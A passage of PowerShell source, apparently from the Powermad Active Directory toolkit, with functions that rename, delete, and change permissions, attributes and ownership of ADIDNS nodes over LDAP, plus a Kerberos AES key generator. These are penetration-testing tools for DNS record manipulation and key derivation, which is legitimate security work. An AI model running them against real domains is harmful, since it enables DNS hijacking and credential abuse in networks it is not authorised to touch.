        Write-Verbose "[+] ADIDNS Zone = $Zone"
    }

    if(!$DistinguishedName)
    {
        
        if($Partition -eq 'System')
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
        }
        else
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName 
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $directory_entry.Rename("DC=$NodeNew")
        Write-Output "[+] ADIDNS node $Node renamed to $NodeNew"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Remove-ADIDNSNode
{
    <#
    .SYNOPSIS
    This function removes an ADIDNS node.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    This function can be used to remove an ADIDNS node. Note that the if the node has not been tombstoned and
    allowed to repliate to all domain controllers, the record will remain in DNS.

    .PARAMETER Credential
    PSCredential object that will be used to delete the ADIDNS node.

    .PARAMETER DistinguishedName
    Distinguished name for the ADIDNS zone. Do not include the node name.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER Node
    The ADIDNS node name.

    .PARAMETER Partition
    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

    .PARAMETER Zone
    The ADIDNS zone.

    .EXAMPLE
    Removes a wildcard node.
    Remove-ADIDNSNode -Node *

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$Node,
        [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
        [parameter(Mandatory=$false)][String]$Zone,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain -or !$Zone)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if(!$Zone)
    {
        $Zone = $current_domain.Name
        Write-Verbose "[+] ADIDNS Zone = $Zone"
    }

    if(!$DistinguishedName)
    {
        
        if($Partition -eq 'System')
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
        }
        else
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName 
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $directory_entry.psbase.DeleteTree()
        Write-Output "[+] ADIDNS node $Node removed"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Revoke-ADIDNSPermission
{
    <#
    .SYNOPSIS
    This function removes an ACE to an ADIDNS node or zone DACL.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    This function is mainly for removing the ACE associated with the user that created the DNS node
    after adding an alternative ACE with Set-DNSPermission. Although this function will work on DNS zones,
    non-administrators will rarely have the ability to modify a DNS zone.

    .PARAMETER Access
    Default = GenericAll: The ACE access type. The options our, AccessSystemSecurity, CreateChild, Delete,
    DeleteChild, DeleteTree, ExtendedRight , GenericAll, GenericExecute, GenericRead, GenericWrite, ListChildren,
    ListObject, ReadControl, ReadProperty, Self, Synchronize, WriteDacl, WriteOwner, WriteProperty.

    .PARAMETER Credential
    PSCredential object that will be used to modify the DACL.

    .PARAMETER DistinguishedName
    Distinguished name for the ADIDNS zone. Do not include the node name.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER Node
    The ADIDNS node name.

    .PARAMETER Partition
    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

    .PARAMETER Principal
    The ACE user or group.

    .PARAMETER Type
    Default = Allow: The ACE allow or deny access type.

    .PARAMETER Zone
    The ADIDNS zone.
    
    .EXAMPLE
    Remove the GenericAll ACE associated for the user1 account.
    Revoke-ADIDNSPermission -Node * -Principal user1 -Access GenericAll

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][ValidateSet("AccessSystemSecurity","CreateChild","Delete","DeleteChild",
        "DeleteTree","ExtendedRight","GenericAll","GenericExecute","GenericRead","GenericWrite","ListChildren",
        "ListObject","ReadControl","ReadProperty","Self","Synchronize","WriteDacl","WriteOwner","WriteProperty")][Array]$Access = "GenericAll",
        [parameter(Mandatory=$false)][ValidateSet("Allow","Deny")][String]$Type = "Allow",    
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$false)][String]$Node,
        [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
        [parameter(Mandatory=$false)][String]$Principal,
        [parameter(Mandatory=$false)][String]$Zone,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain -or !$Zone)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if(!$Zone)
    {
        $Zone = $current_domain.Name
        Write-Verbose "[+] ADIDNS Zone = $Zone"
    }

    if(!$DistinguishedName)
    {

        if($Node)
        {

            if($Partition -eq 'System')
            {
                $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
            }
            else
            {
                $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
            }

        }
        else
        {

            if($Partition -eq 'System')
            {
                $distinguished_name = "DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
            }
            else
            {
                $distinguished_name = "DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
            }

        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = $DistinguishedName 
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $NT_account = New-Object System.Security.Principal.NTAccount($Principal)
        $principal_SID = $NT_account.Translate([System.Security.Principal.SecurityIdentifier])
        $principal_identity = [System.Security.Principal.IdentityReference]$principal_SID
        $AD_rights = [System.DirectoryServices.ActiveDirectoryRights]$Access
        $access_control_type = [System.Security.AccessControl.AccessControlType]$Type
        $AD_security_inheritance = [System.DirectoryServices.ActiveDirectorySecurityInheritance]"All"
        $ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule($principal_identity,$AD_rights,$access_control_type,$AD_security_inheritance)
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
        throw
    }

    try
    {
        $directory_entry.psbase.ObjectSecurity.RemoveAccessRule($ACE) > $null
        $directory_entry.psbase.CommitChanges()
        Write-Output "[+] ACE removed for $Principal"
    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

    return $output
}

function Set-ADIDNSNodeAttribute
{
    <#
    .SYNOPSIS
    This function can append, populate, or overwite values in an ADIDNS node attribute.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    This function can append, populate, or overwite values in an ADIDNS node attribute.

    .PARAMETER Append
    Switch: Appends a value rather than overwriting. This can be used to the dnsRecord attribute
    to create multiple DNS records of the same name for round robin, etc.

    .PARAMETER Attribute
    The ADIDNS node attribute.

    .PARAMETER Credential
    PSCredential object that will be used to modify the attribute.

    .PARAMETER DistinguishedName
    Distinguished name for the ADIDNS zone. Do not include the node name.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER Node
    The ADIDNS node name.

    .PARAMETER Partition
    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

    .PARAMETER Value
    The attribute value.

    .PARAMETER Zone
    The ADIDNS zone.

    .EXAMPLE
    Set the writable description attribute on a node named test.
    Set-ADIDNSNodeAttribute -Node test -Attribute description -Value "do not delete"

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$Attribute,
        [parameter(Mandatory=$true)][String]$Node,
        [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
        [parameter(Mandatory=$false)][String]$Zone,
        [parameter(Mandatory=$true)]$Value,
        [parameter(Mandatory=$false)][Switch]$Append,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain -or !$Zone)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if(!$Zone)
    {
        $Zone = $current_domain.Name
        Write-Verbose "[+] ADIDNS Zone = $Zone"
    }

    if(!$DistinguishedName)
    {
        
        if($Partition -eq 'System')
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
        }
        else
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = "DC=$Node," + $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {

        if($Append)
        {
            $directory_entry.$Attribute.Add($Value) > $null
            $directory_entry.SetInfo()
            Write-Output "[+] ADIDNS node $Node $attribute attribute appended"
        }
        else
        {
            $directory_entry.InvokeSet($Attribute,$Value)
            $directory_entry.SetInfo()
            Write-Output "[+] ADIDNS node $Node $attribute attribute updated"
        }

    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

}

function Set-ADIDNSNodeOwner
{
    <#
    .SYNOPSIS
    This function can sets the owner of an ADIDNS Node.

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause 
    
    .DESCRIPTION
    This function can sets the owner of an ADIDNS Node.

    .PARAMETER Attribute
    The ADIDNS node attribute.

    .PARAMETER Credential
    PSCredential object that will be used to read the attribute.

    .PARAMETER DistinguishedName
    Distinguished name for the ADIDNS zone. Do not include the node name.

    .PARAMETER Domain
    The targeted domain in DNS format. This parameter is required when using an IP address in the DomainController
    parameter.

    .PARAMETER DomainController
    Domain controller to target. This parameter is mandatory on a non-domain attached system.

    .PARAMETER Node
    The ADIDNS node name.

    .PARAMETER Partition
    Default = DomainDNSZones: (DomainDNSZones,ForestDNSZones,System) The AD partition name where the zone is stored.

    .PARAMETER Principal
    The user or group that will be granted ownsership.

    .PARAMETER Zone
    The ADIDNS zone.

    .EXAMPLE
    Set the owner of a node named test to user1.
    Set-ADIDNSNodeOwner -Node test -Principal user1

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    (
        [parameter(Mandatory=$false)][String]$DistinguishedName,
        [parameter(Mandatory=$false)][String]$Domain,
        [parameter(Mandatory=$false)][String]$DomainController,
        [parameter(Mandatory=$true)][String]$Node,
        [parameter(Mandatory=$false)][ValidateSet("DomainDNSZones","ForestDNSZones","System")][String]$Partition = "DomainDNSZones",
        [parameter(Mandatory=$true)][String]$Principal,
        [parameter(Mandatory=$false)][String]$Zone,
        [parameter(Mandatory=$false)][System.Management.Automation.PSCredential]$Credential,
        [parameter(ValueFromRemainingArguments=$true)]$invalid_parameter
    )

    if($invalid_parameter)
    {
        Write-Output "[-] $($invalid_parameter) is not a valid parameter"
        throw
    }

    if(!$DomainController -or !$Domain -or !$Zone)
    {

        try
        {
            $current_domain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            Write-Output "[-] $($_.Exception.Message)"
            throw
        }

    }

    if(!$DomainController)
    {
        $DomainController = $current_domain.PdcRoleOwner.Name
        Write-Verbose "[+] Domain Controller = $DomainController"
    }

    if(!$Domain)
    {
        $Domain = $current_domain.Name
        Write-Verbose "[+] Domain = $Domain"
    }

    if(!$Zone)
    {
        $Zone = $current_domain.Name
        Write-Verbose "[+] ADIDNS Zone = $Zone"
    }

    if(!$DistinguishedName)
    {
       
        if($Partition -eq 'System')
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,CN=$Partition"
        }
        else
        {
            $distinguished_name = "DC=$Node,DC=$Zone,CN=MicrosoftDNS,DC=$Partition"
        }

        $DC_array = $Domain.Split(".")

        ForEach($DC in $DC_array)
        {
            $distinguished_name += ",DC=$DC"
        }

        Write-Verbose "[+] Distinguished Name = $distinguished_name"
    }
    else 
    {
        $distinguished_name = "DC=$Node," + $DistinguishedName
    }

    if($Credential)
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry("LDAP://$DomainController/$distinguished_name",$Credential.UserName,$Credential.GetNetworkCredential().Password)
    }
    else
    {
        $directory_entry = New-Object System.DirectoryServices.DirectoryEntry "LDAP://$DomainController/$distinguished_name"
    }

    try
    {
        $account = New-Object System.Security.Principal.NTAccount($Principal)
        $directory_entry.PsBase.ObjectSecurity.setowner($account)
        $directory_entry.PsBase.CommitChanges()

    }
    catch
    {
        Write-Output "[-] $($_.Exception.Message)"
    }

    if($directory_entry.Path)
    {
        $directory_entry.Close()
    }

    return $output
}

#endregion

#region begin Miscellaneous Functions

function Get-KerberosAESKey
{
    <#
    .SYNOPSIS
    Generate Kerberos AES 128/256 keys from a known username/hostname, password, and kerberos realm. The
    results have been verified against the test values in RFC3962, MS-KILE, and my own test lab.
    
    https://tools.ietf.org/html/rfc3962
    https://msdn.microsoft.com/library/cc233855.aspx

    Author: Kevin Robertson (@kevin_robertson)  
    License: BSD 3-Clause   

    .PARAMETER Password
    [String] Valid password.

    .PARAMETER Salt
    [String] Concatenated string containing the realm and username/hostname.
    AD username format = uppercase realm + case sensitive username (e.g., TEST.LOCALusername, TEST.LOCALAdministrator)
    AD hostname format = uppercase realm + the word host + lowercase hostname without the trailing '$' + . + lowercase
    realm (e.g., TEST.LOCALhostwks1.test.local)

    .PARAMETER Iteration
    [Integer] Default = 4096: Int value representing how many iterations of PBKDF2 will be performed. AD uses the
    default of 4096.
    
    .PARAMETER OutputType
    [String] Default = AES: (AES,AES128,AES256,AES128ByteArray,AES256ByteArray) AES, AES128, and AES256 will output strings.
    AES128Byte and AES256Byte will output byte arrays.

    .EXAMPLE
    Get-KerberosAESKey -Password password -Salt ATHENA.MIT.EDUraeburn -Iteration 1
    Verify results against first RFC3962 sample test vectors in section B.
    
    .EXAMPLE
    Get-KerberosAESKey -Salt TEST.LOCALuser
    Generate keys for a valid AD user.

    .LINK
    https://github.com/Kevin-Robertson/Powermad
    #>

    [CmdletBinding()]
    param
    ( 
        [parameter(Mandatory=$true)][String]$Salt,
        [parameter(Mandatory=$false)][System.Security.SecureString]$Password,
        [parameter(Mandatory=$false)][ValidateSet("AES","AES128","AES256","AES128ByteArray","AES256ByteArray")][String]$OutputType = "AES",
        [parameter(Mandatory=$false)][Int]$Iteration=4096
    )
    
    if(!$Password)
    {
        $password = Read-Host -Prompt "Enter password" -AsSecureString
    }

    $password_BSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($password)
    $password_cleartext = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($password_BSTR)
    
    [Byte[]]$password_bytes = [System.Text.Encoding]::UTF8.GetBytes($password_cleartext)
    [Byte[]]$salt_bytes = [System.Text.Encoding]::UTF8.GetBytes($Salt)
    $AES256_constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93,0x5C,0x9B,0xDC,0xDA,0xD9,0x5C,0x98,0x99,0xC4,0xCA,0xE4,0xDE,0xE6,0xD6,0xCA,0xE4
    $AES128_constant = 0x6B,0x65,0x72,0x62,0x65,0x72,0x6F,0x73,0x7B,0x9B,0x5B,0x2B,0x93,0x13,0x2B,0x93
    $IV = 0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00 
    $PBKDF2 = New-Object Security.Cryptography.Rfc2898DeriveBytes($password_bytes,$salt_bytes,$iteration)
    $PBKDF2_AES256_key = $PBKDF2.GetBytes(32)
    $PBKDF2_AES128_key = $PBKDF2_AES256_key[0..15]
    $PBKDF2_AES256_key_string = ([System.BitConverter]::ToString($PBKDF2_AES256_key)) -replace "-",""
    $PBKDF2_AES128_key_string = ([System.BitConverter]::ToString($PBKDF2_AES128_key)) -replace "-",""
    Write-Verbose "PBKDF2 AES128 Key: $PBKDF2_AES128_key_string"
    Write-Verbose "PBKDF2 AES256 Key: $PBKDF2_AES256_key_string"
    $AES = New-Object "System.Security.Cryptography.AesManaged"
    $AES.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $AES.Padding = [System.Security.Cryptography.PaddingMode]::None
    $AES.IV = $IV
    # AES 256
    $AES.KeySize = 256
    $AES.Key = $PBKDF2_AES256_key
    $AES_encryptor = $AES.CreateEncryptor()
    $AES256_key_part_1 = $AES_encryptor.TransformFinalBlock($AES256_constant,0,$AES256_constant.Length)
    $AES256_key_part_2 = $AES_encryptor.TransformFinalBlock($AES256_key_part_1,0,$AES256_key_part_1.Length)
    $AES256_key = $AES256_key_part_1[0..15] + $AES256_key_part_2[0..15]
    $AES256_key_string = ([System.BitConverter]::ToString($AES256_key)) -replace "-",""    
    # AES 128
    $AES.KeySize = 128
    $AES.Key = $PBKDF2_AES128_key
    $AES_encryptor = $AES.CreateEncryptor()
    $AES128_key = $AES_encryptor.TransformFinalBlock($AES128_constant,0,$AES128_constant.Length)
    $AES128_key_string = ([System.BitConverter]::ToString($AES128_key)) -replace "-",""
    Remove-Variable password_cleartext
    
    switch($OutputType)
    {
    
        'AES'
        {
            Write-Output "AES128 Key: $AES128_key_string"
            Write-Output "AES256 Key: $AES256_key_string"
        }
        
        'AES128'
        {
            Write-Output "$AES128_key_string"
        }
        
        'AES256'
        {
            Write-Output "$AES256_key_string"
        }
        
        'AES128ByteArray'
        {
            Write-Output $AES128_key
        }
        
        'AES256ByteArray'
        {
            Write-Output $AES256_key
        }
        
    }
    
}

#endregion
